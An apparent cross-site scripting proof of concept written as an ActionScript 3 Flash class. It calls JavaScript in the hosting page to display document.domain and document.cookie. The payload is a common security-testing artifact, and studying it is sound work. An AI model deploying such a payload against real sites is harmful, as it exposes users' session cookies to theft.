package {
  import flash.display.Sprite;
  import flash.external.ExternalInterface;

  public class xss extends Sprite {
    public function xss() {
      ExternalInterface.call("prompt(document.domain,document.cookie)");
    }
  }
}
